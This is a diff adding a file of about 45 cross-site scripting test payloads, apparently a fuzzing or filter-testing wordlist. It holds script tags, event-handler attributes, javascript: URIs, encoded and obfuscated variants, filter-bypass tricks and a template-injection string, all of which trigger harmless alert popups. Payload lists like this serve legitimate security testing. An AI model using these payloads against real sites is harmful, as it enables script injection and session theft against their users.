@@ -1,0 +1,45 @@
+<script>alert(1)</script>
+<ScRiPt>alert(document.cookie)</sCrIpT>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert('XSS')>
+"><script>alert(1)</script>
+'><img src=x onerror=prompt(1)>
+" onmouseover="alert(1)
+' autofocus onfocus='alert(1)
+javascript:alert(1)
+JaVaScRiPt:alert(document.domain)
+java&#x09;script:alert(1)
+&lt;script&gt;alert(1)&lt;/script&gt;
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href="javascript:alert(1)">click</a>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<video><source onerror="alert(1)">
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:alert(1)">
+<div style="background:url(javascript:alert(1))">
+<div style="width:expression(alert(1))">
+<marquee onstart=alert(1)>
+<x onclick=alert(1)>click
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<script>alert(1)</script>
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<form action="javascript:alert(1)"><input type=submit>
+<button formaction=javascript:alert(1)>x</button>
+<base href="javascript:alert(1)//">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+{{constructor.constructor('alert(1)')()}}
+<img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
+＜script＞alert(1)＜/script＞
+<img/src="x"/onerror=alert(1)>
+<svg><script>alert&#40;1&#41;</script>
+"><svg/onload=confirm`1`>
+<a href=" &#14; javascript:alert(1)">x</a>
